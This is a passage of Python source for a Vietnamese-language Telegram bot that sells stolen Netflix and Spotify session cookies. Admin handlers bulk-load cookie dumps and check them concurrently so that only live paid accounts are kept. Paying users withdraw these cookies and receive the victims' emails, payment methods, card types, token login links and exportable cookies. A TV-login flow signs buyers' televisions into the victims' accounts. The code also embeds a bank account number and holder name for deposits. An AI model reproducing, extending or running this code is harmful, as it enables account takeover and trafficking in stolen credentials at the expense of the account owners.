        buttons = [[InlineKeyboardButton(f"🗑 {item[1]} ({item[3]} lượt) - {item[2]:,.0f}đ", callback_data=f'admin_delstore_{item[0]}')] for item in items]
        buttons.append([InlineKeyboardButton("🏡 Quay Lại", callback_data='admin_panel')])
        await query.edit_message_text("🗑 *XÓA GÓI CỬA HÀNG*\n\nChọn gói muốn xóa:", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(buttons))

    elif query.data.startswith('admin_delstore_'):
        if user.id != ADMIN_ID: return
        item_id = int(query.data.split('_')[2])
        delete_store_item(item_id)
        await query.answer("✅ Đã xóa gói khỏi cửa hàng!", show_alert=True)
        await query.edit_message_text("✅ Đã xóa gói thành công.", reply_markup=kb_admin())

    # ─── MENU LỰA CHỌN NẠP COOKIE ───
    elif query.data == 'admin_choose_add_type':
        if user.id != ADMIN_ID: return
        buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("🍿 Nạp Cookie Netflix", callback_data='admin_addcookie_vip')],
            [InlineKeyboardButton("🎧 Nạp Cookie Spotify", callback_data='admin_upload_spotify_init')],
            [InlineKeyboardButton("🏡 Quay Lại", callback_data='admin_panel')]
        ])
        await query.edit_message_text("🍪 *CHỌN LOẠI COOKIE MUỐN NẠP VÀO KHO:*", parse_mode='Markdown', reply_markup=buttons)

    # ─── YÊU CẦU UPLOAD SPOTIFY ───
    elif query.data == 'admin_upload_spotify_init':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("🎧 *NẠP COOKIE SPOTIFY*\n\nVui lòng gửi file `.zip` chứa các file `.txt` cookie.\nBot sẽ tự động giải nén, chuyển sang JSON và chỉ lọc tài khoản **Premium** / **Chủ Family**.", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_upload_cookie_spotify'

    # ─── MENU TRÍCH XUẤT SPOTIFY CỦA ADMIN ───
    elif query.data == 'admin_get_spotify':
        if user.id != ADMIN_ID: return
        buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("🎵 Lấy Premium Thường", callback_data='admin_pull_spotify_PREMIUM')],
            [InlineKeyboardButton("👨‍👩‍👧‍👦 Lấy Chủ Family", callback_data='admin_pull_spotify_FAMILY_OWNER')],
            [InlineKeyboardButton("🏡 Quay Lại", callback_data='admin_panel')]
        ])
        await query.edit_message_text("🎧 *TRÍCH XUẤT COOKIE SPOTIFY (JSON)*\n\nBạn muốn lấy loại tài khoản nào?", parse_mode='Markdown', reply_markup=buttons)

    # ─── LOGIC TRÍCH XUẤT VÀ GỬI FILE JSON ───
    elif query.data.startswith('admin_pull_spotify_'):
        if user.id != ADMIN_ID: return
        
        # Dùng replace thay vì split để không bị đứt chữ FAMILY_OWNER
        plan_type = query.data.replace('admin_pull_spotify_', '')
        
        cookie_data = get_spotify_cookie_from_db(plan_type)
        plan_display = plan_type.replace('_', ' ') # FIX MARKDOWN LỖI
        
        if not cookie_data:
            await query.answer(f"❌ Kho {plan_display} hiện tại đang trống!", show_alert=True)
            return
            
        c_id, json_str, email, country = cookie_data
        
        filename = f"Spotify_{plan_type}_{country}_{email.split('@')[0]}.json"
        
        caption = (
            f"✅ *ĐÃ TRÍCH XUẤT SPOTIFY COOKIE*\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📧 **Email:** `{email}`\n"
            f"🌍 **Quốc gia:** {country}\n"
            f"🏷 **Loại:** {plan_display}\n\n"
            f"💡 _Import file JSON này vào EditThisCookie để đăng nhập._"
        )
        
        await context.bot.send_document(
            chat_id=update.effective_chat.id, 
            document=io.BytesIO(json_str.encode('utf-8')), 
            filename=filename, 
            caption=caption,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔁 Lấy Thêm", callback_data='admin_get_spotify'), InlineKeyboardButton("🏡 Đóng", callback_data='admin_panel')]])
        )
        try: await query.message.delete()
        except: pass

    elif query.data == 'admin_addcookie_vip':
        if user.id != ADMIN_ID: return
        buttons = InlineKeyboardMarkup([[InlineKeyboardButton("⚡ Nạp Nhanh (Không Check)", callback_data='admin_upload_fast_vip')], [InlineKeyboardButton("🔍 Check & Nạp (Lọc Sống)", callback_data='admin_upload_check_vip')], [InlineKeyboardButton("🏡 Quay Lại", callback_data='back_main')]])
        await query.edit_message_text("🍪 *THÊM COOKIE VÀO KHO BÁN*\n\nChọn chế độ nạp:\n\n⚡ *Nạp Nhanh* — Nạp thẳng, không check (Tốc độ cao).\n🔍 *Check & Nạp* — Kiểm tra đa luồng và chỉ nạp SỐNG.", parse_mode='Markdown', reply_markup=buttons)

    elif query.data == 'admin_upload_fast_vip':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("⚡ *NẠP NHANH*\n\nVui lòng tải lên file `.txt` hoặc `.zip` chứa cookie.\nBot sẽ nạp thẳng tất cả vào kho VIP mà *không check*.", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_upload_cookie_vip_fast'

    elif query.data == 'admin_upload_check_vip':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("🔍 *CHECK & NẠP (ĐA LUỒNG)*\n\nVui lòng tải lên file `.txt` hoặc `.zip` chứa cookie.\nBot sẽ kiểm tra đa luồng (15 workers) và chỉ nạp cookie *SỐNG (Current Member)* vào kho.", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_upload_cookie_vip'
        
    # ─── QUẢN LÝ KHO COOKIE (Hiển thị chi tiết NF & SP) ───
    elif query.data == 'admin_cookie_inventory':
        if user.id != ADMIN_ID: return
        nf_count = get_premium_cookie_count()
        sp_prem = get_spotify_cookie_count('PREMIUM')
        sp_fam = get_spotify_cookie_count('FAMILY_OWNER')
        
        buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("🧹 Xóa Cookie Lỗi (Netflix)", callback_data='admin_purge_dead')],
            [InlineKeyboardButton("💣 Xóa All Netflix", callback_data='admin_purge_all_nf'), 
             InlineKeyboardButton("💣 Xóa All Spotify", callback_data='admin_purge_all_sp')],
            [InlineKeyboardButton("🏡 Quay Lại", callback_data='admin_panel')]
        ])
        text = (
            f"📦 *KHO COOKIE VIP*\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🍿 **Netflix:** `{nf_count}` cookie\n\n"
            f"🎧 **Spotify Premium:** `{sp_prem}` cookie\n"
            f"👨‍👩‍👧‍👦 **Spotify Family:** `{sp_fam}` cookie\n"
        )
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=buttons)

    elif query.data == 'admin_purge_all_nf':
        if user.id != ADMIN_ID: return
        buttons = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Xác Nhận Xóa Hết", callback_data='admin_purge_all_nf_confirm')], [InlineKeyboardButton("❌ Hủy", callback_data='admin_cookie_inventory')]])
        await query.edit_message_text("⚠️ *BẠN CÓ CHẮC MUỐN XÓA TOÀN BỘ COOKIE NETFLIX TRONG KHO?*", parse_mode='Markdown', reply_markup=buttons)

    elif query.data == 'admin_purge_all_sp':
        if user.id != ADMIN_ID: return
        buttons = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Xác Nhận Xóa Hết", callback_data='admin_purge_all_sp_confirm')], [InlineKeyboardButton("❌ Hủy", callback_data='admin_cookie_inventory')]])
        await query.edit_message_text("⚠️ *BẠN CÓ CHẮC MUỐN XÓA TOÀN BỘ COOKIE SPOTIFY TRONG KHO?*", parse_mode='Markdown', reply_markup=buttons)

    elif query.data == 'admin_purge_all_nf_confirm':
        if user.id != ADMIN_ID: return
        deleted = purge_all_premium_cookies()
        await query.edit_message_text(f"💣 *ĐÃ XÓA TOÀN BỘ KHO NETFLIX!*\n\nĐã xóa *{deleted}* cookie.", parse_mode='Markdown', reply_markup=kb_admin())

    elif query.data == 'admin_purge_all_sp_confirm':
        if user.id != ADMIN_ID: return
        conn = get_connection()
        c = conn.cursor()
        c.execute("DELETE FROM spotify_cookies")
        deleted = c.rowcount
        conn.commit()
        conn.close()
        await query.edit_message_text(f"💣 *ĐÃ XÓA TOÀN BỘ KHO SPOTIFY!*\n\nĐã xóa *{deleted}* cookie.", parse_mode='Markdown', reply_markup=kb_admin())

    elif query.data == 'admin_purge_dead':
        if user.id != ADMIN_ID: return
        all_cookies_raw = get_all_premium_cookies()
        if not all_cookies_raw:
            await query.edit_message_text("❌ Kho đang trống, không có cookie nào để kiểm tra.", reply_markup=kb_admin())
            return
        total = len(all_cookies_raw)
        status_msg = await query.edit_message_text(f"🧹 *Đang quét {total} cookie trong kho...*\n\n  Vui lòng chờ...", parse_mode='Markdown')
        dead_ids, live_count, last_update = [], 0, time.time()
        for i, (c_id, c_data) in enumerate(all_cookies_raw, 1):
            c_dict_list = checker.extract_cookies_from_text(c_data)
            if not c_dict_list:
                dead_ids.append(c_id)
                continue
            try:
                success, token, error, account = await asyncio.wait_for(asyncio.to_thread(checker.check_cookie, c_dict_list[0]), timeout=15)
                if success and token:
                    mem_status = account.get('membership_status', 'N/A')
                    if mem_status != 'CURRENT_MEMBER': dead_ids.append(c_id)
                    else: live_count += 1
                else: dead_ids.append(c_id)
            except Exception: dead_ids.append(c_id)
            now = time.time()
            if now - last_update >= 3:
                try: await status_msg.edit_text(f"🧹 *Đang quét cookie...*\n\n  📋 Tiến độ: *{i}* / *{total}* ({round(i/total*100)}%)\n  ✅ Sống: *{live_count}*\n  ❌ Lỗi: *{len(dead_ids)}*", parse_mode='Markdown')
                except: pass
                last_update = now
        for c_id in dead_ids: delete_premium_cookie(c_id)
        await status_msg.edit_text(f"🧹 *HOÀN TẤT DỌN KHO!*\n\n✅ Cookie sống: *{live_count}*\n🗑 Đã xóa: *{len(dead_ids)}* cookie lỗi/hết hạn", parse_mode='Markdown', reply_markup=kb_admin())

    elif query.data == 'admin_toggle_mtn':
        if user.id != ADMIN_ID: return
        global MAINTENANCE_MODE
        MAINTENANCE_MODE = not MAINTENANCE_MODE
        await query.answer(f"Đã {'BẬT' if MAINTENANCE_MODE else 'TẮT'} chế độ bảo trì!", show_alert=True)
        await query.edit_message_reply_markup(reply_markup=kb_admin())

    elif query.data == 'admin_add_discount':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("🎟 *TẠO MÃ KHUYẾN MÃI*\n\nVui lòng nhắn tin theo cú pháp:\n`<TÊN_MÃ> <SỐ_TIỀN> <LƯỢT_DÙNG>`\n\nVí dụ: `SALE50K 50000 10`", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_add_discount'

    elif query.data == 'admin_ban_user':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("🔒 *KHÓA TÀI KHOẢN (BAN)*\n\nVui lòng nhắn tin ID của người dùng cần khóa.\nVí dụ: `123456789`", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_ban_user'

    elif query.data == 'admin_unban_user':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("🔓 *MỞ KHÓA TÀI KHOẢN (UNBAN)*\n\nVui lòng nhắn tin ID của người dùng cần mở khóa.\nVí dụ: `123456789`", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_unban_user'
        
    elif query.data.startswith('admin_unban_'):
        if user.id != ADMIN_ID: return
        uid = int(query.data.split('_')[2])
        unban_user(uid)
        await query.answer(f"Đã mở khóa user {uid}!", show_alert=True)

    elif query.data == 'admin_list_users':
        if user.id != ADMIN_ID: return
        users = get_all_users()
        total, banned = len(users), sum(1 for u in users if u[3] == 1)
        text = f"👥 *DANH SÁCH NGƯỜI DÙNG*\nTổng số: {total} | Bị khóa: {banned}\n\n"
        for u in users[:50]: text += f"{'🚫' if u[3] == 1 else '✅'} ID: `{u[0]}` | Tên: {u[1]} | Gói: {u[2]}\n"
        if total > 50: text += "\n... (và nhiều user khác)"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_admin())

    elif query.data == 'admin_list_banned':
        if user.id != ADMIN_ID: return
        banned_users = get_banned_users()
        if not banned_users: text = "✅ *Không có user nào bị khóa.*"
        else:
            text = f"🚫 *DANH SÁCH USER BỊ KHÓA ({len(banned_users)})*\n\n"
            for u in banned_users: text += f"ID: `{u[0]}` | Tên: {u[1]}\n"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_admin())

    elif query.data == 'admin_broadcast':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("📢 *GỬI THÔNG BÁO*\n\nVui lòng nhắn tin nội dung bạn muốn gửi đến tất cả người dùng.", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_broadcast'

    elif query.data == 'cancel_task':
        chat_id = update.effective_chat.id
        if chat_id in active_tasks:
            active_tasks[chat_id] = True
            await query.edit_message_text(f"{banner_result_fail()}\n  ⏹ Đã dừng tác vụ.\n\n  {DIVIDER_THIN}\n  {FOOTER}", parse_mode='Markdown')
        else: await query.answer("Không có tác vụ nào đang chạy")

    elif query.data == 'admin_panel':
        if user.id != ADMIN_ID: return
        total, active, tokens, avail, used = get_stats()
        text = f"👑 *ADMIN DASHBOARD*\n━━━━━━━━━━━━━━━━━━\n👥 Tổng User: {total}\n🟢 Active hôm nay: {active}\n🔗 Tổng Link tạo: {tokens}\n🎁 Kho Cookie: {avail} (đã phát: {used})\n━━━━━━━━━━━━━━━━━━\n👉 Chọn tính năng quản lý bên dưới:"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_admin())

    elif query.data == 'back_main':
        bal, cred = get_user_economy(user.id)
        await query.edit_message_text(banner_main(user.id, name, bal, cred), parse_mode='Markdown', reply_markup=kb_main())
        context.user_data['awaiting'] = None

    elif query.data == 'proxy_set':
        text = f"{LOGO}  ›  *Thiết lập Proxy*\n{DIVIDER}\n\n📝 Gửi proxy theo định dạng:\n\n  • `IP:Port`\n  • `IP:Port:User:Pass`\n\n  {DIVIDER_THIN}\n  {FOOTER}"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())
        context.user_data['awaiting'] = 'add_proxy'

    elif query.data == 'proxy_toggle':
        if proxy_manager.proxy_enabled:
            proxy_manager.disable()
            await query.answer('Proxy da tat')
        else:
            if proxy_manager.proxy:
                proxy_manager.enable()
                await query.answer('Proxy da bat')
            else:
                await query.answer('Chua cai dat proxy')
                return
        text = f"{LOGO}  ›  *Cài đặt Proxy*\n{DIVIDER}\n\n  {proxy_manager.get_status_icon()}  Trạng thái:  {proxy_manager.get_status_text()}\n\n{DIVIDER_THIN}\n{FOOTER}"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_proxy())

# ══════════════════════════════════════════
#  MESSAGE HANDLERS
# ══════════════════════════════════════════
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return
    
    try:
        await update.message.delete()
    except Exception:
        pass
        
    text = update.message.text or update.message.caption or ''
    awaiting = context.user_data.get('awaiting')
    user_id = update.effective_user.id if update.effective_user else 0

    def send_no_action_reply():
        return context.bot.send_message(chat_id=update.effective_chat.id, text=f"{banner_result_fail()}\n  Hiện tại bot đang chờ thao tác.\n  Hãy mở menu và chọn chức năng phù hợp.\n\n  {DIVIDER_THIN}\n  {FOOTER}", parse_mode='Markdown', reply_markup=kb_main())

    if not awaiting:
        await send_no_action_reply()
        return

    # ── Handle TV Code Input ──
    if awaiting == 'tv_code':
        tv_code = text.strip().replace(" ", "").replace("-", "")
        if len(tv_code) < 4:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Mã TV không hợp lệ. Vui lòng kiểm tra và nhập lại (ví dụ: 12345678).")
            return
            
        status_msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="⏳ *Đang kết nối vào hệ thống để đăng nhập TV...*", parse_mode='Markdown')

        cookies = pop_premium_cookies(1, user_id)
        if not cookies:
             await status_msg.edit_text("❌ Rất tiếc, kho hiện tại đã hết cookie! Vui lòng thử lại sau.", reply_markup=kb_main())
             context.user_data['awaiting'] = None
             return
             
        c_id, c_data = cookies[0]
        c_dict_list = checker.extract_cookies_from_text(c_data)
        
        if not c_dict_list:
             delete_premium_cookie(c_id) 
             await status_msg.edit_text("❌ Cookie lấy ra bị lỗi định dạng, vui lòng gõ lại mã để lấy cookie khác.", reply_markup=kb_main())
             return
             
        cookie_dict = c_dict_list[0]
        
        success, error_msg, account_info = await asyncio.to_thread(process_tv_login, cookie_dict, tv_code)

        if success:
            return_premium_cookie(c_id) 
            card = format_account_card(account_info, "Đăng nhập trực tiếp trên TV thành công!")
            await status_msg.edit_text(f"🎉 *ĐĂNG NHẬP TV THÀNH CÔNG!*\n\nTV của bạn đã được kết nối với tài khoản dưới đây:\n\n{card}", parse_mode='Markdown', reply_markup=kb_done_with_report())
        else:
            if "Cookie đã chết" in error_msg:
                delete_premium_cookie(c_id)
            else:
                return_premium_cookie(c_id) 
                
            await status_msg.edit_text(f"❌ *ĐĂNG NHẬP TV THẤT BẠI!*\n\nLý do: `{error_msg}`\n\nVui lòng kiểm tra lại mã hoặc bấm nút *Đăng Nhập TV* lại để lấy cookie khác (Mã TV chỉ có hiệu lực trong 5 phút).", parse_mode='Markdown', reply_markup=kb_main())
        context.user_data['awaiting'] = None
        return

    # ── ADMIN: Admin Send Reply to User ──
    if awaiting and awaiting.startswith('admin_send_reply_'):
        if user_id != ADMIN_ID: return
        target_uid = awaiting.split('_')[3]
        try:
            await context.bot.send_message(chat_id=target_uid, text=f"💬 *Tin nhắn từ Admin:*\n\n{text}", parse_mode='Markdown')
            await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Đã gửi phản hồi thành công!")
        except Exception as e:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Không gửi được tin nhắn cho khách: {e}")
        context.user_data['awaiting'] = None
        return

    # ── ADMIN: Lookup Bill ──
    if awaiting == 'admin_lookup_bill':
        if user_id != ADMIN_ID: return
        try:
            bill_id = int(text.replace('#', '').strip())
            bill = get_purchase_by_id(bill_id)
            if bill:
                b_id, b_uid, b_plan, b_price, b_date = bill
                msg_txt = (
                    f"🧾 *CHI TIẾT HÓA ĐƠN #{b_id}*\n\n"
                    f"👤 ID Người mua: `{b_uid}`\n"
                    f"📦 Gói đã mua: `{b_plan}`\n"
                    f"💰 Số tiền: `{b_price:,.0f}đ`\n"
                    f"🕒 Thời gian: `{b_date}`"
                )
                admin_markup = InlineKeyboardMarkup([[InlineKeyboardButton("💬 Trả lời Khách này", callback_data=f"admin_reply_{b_uid}")]])
                await context.bot.send_message(chat_id=update.effective_chat.id, text=msg_txt, parse_mode='Markdown', reply_markup=admin_markup)
            else:
                await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Không tìm thấy hóa đơn này trên hệ thống.", reply_markup=kb_admin())
        except ValueError:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ ID hóa đơn không hợp lệ, vui lòng nhập số.", reply_markup=kb_admin())
        context.user_data['awaiting'] = None
        return

    # ── ADMIN: Other States ──
    if awaiting == 'admin_add_discount' and user_id == ADMIN_ID:
        args = text.split()
        if len(args) == 3:
            try:
                code, amount, uses = args[0], int(args[1]), int(args[2])
                add_discount_code(code, amount, uses)
                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Đã tạo mã `{code}` trị giá {amount:,.0f}đ ({uses} lượt).", parse_mode='Markdown')
            except ValueError:
                await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Lỗi: Số tiền hoặc lượt dùng không hợp lệ.")
        else: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Sai cú pháp. Ví dụ: `SALE50K 50000 10`", parse_mode='Markdown')
        context.user_data['awaiting'] = None
        return

    if awaiting == 'admin_ban_user' and user_id == ADMIN_ID:
        try:
            uid = int(text.strip())
            ban_user(uid)
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Đã khóa tài khoản ID `{uid}`.", parse_mode='Markdown')
            try: await context.bot.send_message(chat_id=uid, text="🚫 *TÀI KHOẢN ĐÃ BỊ KHÓA*\n\nTài khoản của bạn đã bị Admin khóa do vi phạm chính sách.", parse_mode='Markdown')
            except: pass
        except ValueError: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ ID không hợp lệ.")
        context.user_data['awaiting'] = None
        return

    if awaiting == 'admin_unban_user' and user_id == ADMIN_ID:
        try:
            uid = int(text.strip())
            unban_user(uid)
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Đã mở khóa tài khoản ID `{uid}`.", parse_mode='Markdown')
        except ValueError: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ ID không hợp lệ.")
        context.user_data['awaiting'] = None
        return

    if awaiting == 'report_error':
        admin_text = f"⚠️ *BÁO CÁO LỖI TỪ NGƯỜI DÙNG*\n\n👤 User ID: `{user_id}`\n📝 Nội dung: {text if text else '(Có đính kèm tệp/ảnh)'}"
        admin_markup = InlineKeyboardMarkup([[InlineKeyboardButton("💬 Trả lời Khách", callback_data=f"admin_reply_{user_id}")]])
        try:
            if update.message.photo: await context.bot.send_photo(chat_id=ADMIN_ID, photo=update.message.photo[-1].file_id, caption=admin_text, parse_mode='Markdown', reply_markup=admin_markup)
            else: await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text, parse_mode='Markdown', reply_markup=admin_markup)
            await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Cảm ơn bạn! Báo cáo của bạn đã được gửi đến Admin.", reply_markup=kb_main())
        except Exception: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Lỗi khi gửi báo cáo.", reply_markup=kb_main())
        context.user_data['awaiting'] = None
        return

    if awaiting == 'deposit_enter_amount':
        try:
            amount = int(text.replace(',', '').replace('.', '').strip())
            if amount <= 0: raise ValueError
        except ValueError:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Số tiền không hợp lệ. Vui lòng nhập lại số tiền (VD: `50000`).")
            return
        url = f"https://img.vietqr.io/image/MB-17363999999999-compact2.png?amount={amount}&addInfo=NAP%20{user_id}&accountName=BUI%20MINH%20NHUT"
        caption = f"💸 *QR NẠP TIỀN TỰ ĐỘNG*\n\n💰 Số tiền: *{amount:,.0f}đ*\n📝 Nội dung: `NAP {user_id}`\n\nVui lòng quét mã QR để chuyển khoản. Sau đó bấm nút bên dưới."
        markup = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Đã Chuyển Khoản", callback_data=f"deposit_submit_bill_{amount}")], [InlineKeyboardButton("🏡 Hủy Bỏ", callback_data="back_main")]])
        await context.bot.send_photo(chat_id=update.effective_chat.id, photo=url, caption=caption, parse_mode='Markdown', reply_markup=markup)
        context.user_data['awaiting'] = None
        return

    if awaiting and awaiting.startswith('deposit_bill_'):
        amount = int(awaiting.split('_')[2])
        tx_id = create_transaction(user_id, amount)
        admin_text = f"🔔 *YÊU CẦU NẠP TIỀN*\n\n👤 User ID: `{user_id}`\n💰 Số tiền: *{amount:,.0f}đ*\nMã GD: `#{tx_id}`\n\nKèm hình ảnh bill của khách hàng bên dưới."
        admin_buttons = [[InlineKeyboardButton("✅ Duyệt Nạp", callback_data=f"admin_approve_tx_{tx_id}")], [InlineKeyboardButton("🚫 Từ Chối", callback_data=f"admin_reject_tx_{tx_id}")], [InlineKeyboardButton("💬 Trả lời Khách", callback_data=f"admin_reply_{user_id}")]]
        try:
            if update.message.photo: await context.bot.send_photo(chat_id=ADMIN_ID, photo=update.message.photo[-1].file_id, caption=admin_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(admin_buttons))
            else: await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text + "\n*(Khách không gửi ảnh bill)*", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(admin_buttons))
        except: pass
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ *Gửi yêu cầu thành công!*\n\nSố tiền yêu cầu: *{amount:,.0f}đ*\nMã giao dịch: `#{tx_id}`\n\nVui lòng chờ Admin kiểm tra và duyệt.", parse_mode='Markdown', reply_markup=kb_main())
        context.user_data['awaiting'] = None
        return
        
    if awaiting == 'admin_setplan' and user_id == ADMIN_ID:
        args = text.split()
        if len(args) == 2:
            if set_plan(args[0], args[1].upper()): await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Đã set user `{args[0]}` lên gói `{args[1].upper()}`", parse_mode='Markdown')
            else: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Gói cước không tồn tại!")
        else: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Sai cú pháp. Ví dụ: `123456 VIP`", parse_mode='Markdown')
        context.user_data['awaiting'] = None
        return

    if awaiting == 'admin_addplan' and user_id == ADMIN_ID:
        args = text.split()
        if len(args) == 3:
            try:
                add_plan(args[0].upper(), int(args[1]), int(args[2]))
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"✅ Đã tạo cấu hình giới hạn gói `{args[0].upper()}` thành công!\n\n"
                    f"💡 *Lưu ý:* Để gói này hiển thị lên kệ hàng cho khách mua, bạn vui lòng sử dụng chức năng **🛒 Thêm Gói CH** nhé!", 
                    parse_mode='Markdown', reply_markup=kb_admin()
                )
            except ValueError: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Số lượt phải là một con số hợp lệ.", reply_markup=kb_admin())
        else: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Sai cú pháp. Ví dụ: `PRO 999 5`", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = None
        return

    if awaiting == 'admin_addstore' and user_id == ADMIN_ID:
        args = text.split()
        if len(args) == 3:
            try:
                plan_name, price, credits = args[0].upper(), int(args[1]), int(args[2])
                add_store_item(plan_name, price, credits)
                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Đã đưa gói `{plan_name}` lên kệ hàng!\n💰 Giá bán: {price:,.0f}đ\n🎫 Lượt rút cookie VIP: {credits}", parse_mode='Markdown', reply_markup=kb_admin())
            except ValueError: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Giá và lượt phải là số hợp lệ.", reply_markup=kb_admin())
        else: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Sai cú pháp. Ví dụ: `VIP1 20000 10`", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = None
        return

    if awaiting == 'admin_broadcast' and user_id == ADMIN_ID:
        conn = get_connection()
        c = conn.cursor()
        c.execute("SELECT user_id FROM users")
        users = c.fetchall()
        conn.close()
        success = 0
        status_broadcast = await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Đang gửi tới {len(users)} users...")
        for u in users:
            try:
                await context.bot.send_message(chat_id=u[0], text=f"📢 *THÔNG BÁO TỪ ADMIN*\n\n{text}", parse_mode='Markdown')
                success += 1
            except: pass
        await status_broadcast.edit_text(f"✅ Đã gửi thành công đến {success} users.")
        context.user_data['awaiting'] = None
        return

    if awaiting == 'extract_vip_count':
        try:
            count = int(text.strip())
            if count <= 0: raise ValueError
        except ValueError:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Vui lòng nhập một số hợp lệ lớn hơn 0.")
            return
        bal, cred = get_user_economy(user_id)
        if cred < count and user_id != ADMIN_ID:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Bạn chỉ còn {cred} lượt rút VIP. Vui lòng nạp thêm hoặc giảm số lượng.")
            context.user_data['awaiting'] = None
            return
        avail = get_premium_cookie_count()
        if avail < count:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Kho hiện tại chỉ còn {avail} cookie. Vui lòng rút số lượng ít hơn.")
            context.user_data['awaiting'] = None
            return
        status_msg = await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⏳ Đang tiến hành rút và kiểm tra {count} cookie từ kho...")
        success_results, attempts, max_attempts = [], 0, count * 3
        while len(success_results) < count and attempts < max_attempts:
            cookies = pop_premium_cookies(1, user_id)
            if not cookies: break
            c_id, c_data = cookies[0]
            c_dict_list = checker.extract_cookies_from_text(c_data)
            if not c_dict_list:
                delete_premium_cookie(c_id)
                continue
            c_dict = c_dict_list[0]
            success, token, error, account = checker.check_cookie(c_dict)
            attempts += 1
            if success and token and account.get('membership_status') == 'CURRENT_MEMBER':
                success_results.append({'cookies': c_dict, 'token': token, 'link': checker.format_nftoken_link(token), 'account': account})
                deduct_credits(user_id, 1)
            else: 
                if not success or not token or account.get('membership_status') in ('FORMER_MEMBER', 'ON HOLD'):
                    delete_premium_cookie(c_id)
                else:
                    return_premium_cookie(c_id)
            
        if not success_results: await status_msg.edit_text("❌ Rất tiếc, kho cookie tạm thời bị lỗi hoặc hết cookie sống. Số lượt rút của bạn vẫn được giữ nguyên.")
        else:
            actual_count = len(success_results)
            content_lines = [f"════════════════════════════════════════\n BÁO CÁO RÚT COOKIE VIP\n Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n Đã rút thành công: {actual_count}/{count} cookie\n════════════════════════════════════════\n"]
            for i, res in enumerate(success_results, 1):
                acc = res['account']
                content_lines.extend([f"[{i}] TÀI KHOẢN", f"Email: {acc.get('email', 'N/A')}", f"Gói cước: {acc.get('plan', 'N/A')} - {acc.get('country', 'N/A')}", f"Thanh toán: {acc.get('payment_method', 'N/A')} - {acc.get('cc_type', 'N/A')}", f"NFToken: {res['token']}", f"Login Link: {res['link']}", f"\nNetscape Cookie:\n{checker.build_netscape_format(res['cookies'])}", f"\n{'='*40}\n"])
            fname = f"VIP_Cookies_{actual_count}_{datetime.now().strftime('%H%M%S')}.txt"
            await context.bot.send_document(chat_id=update.effective_chat.id, document=io.BytesIO("\n".join(content_lines).encode('utf-8')), filename=fname, caption=f"🎉 Đã rút thành công {actual_count} cookie VIP.\nĐã trừ {actual_count} lượt rút từ tài khoản của bạn.")
            await status_msg.delete()
        context.user_data['awaiting'] = None
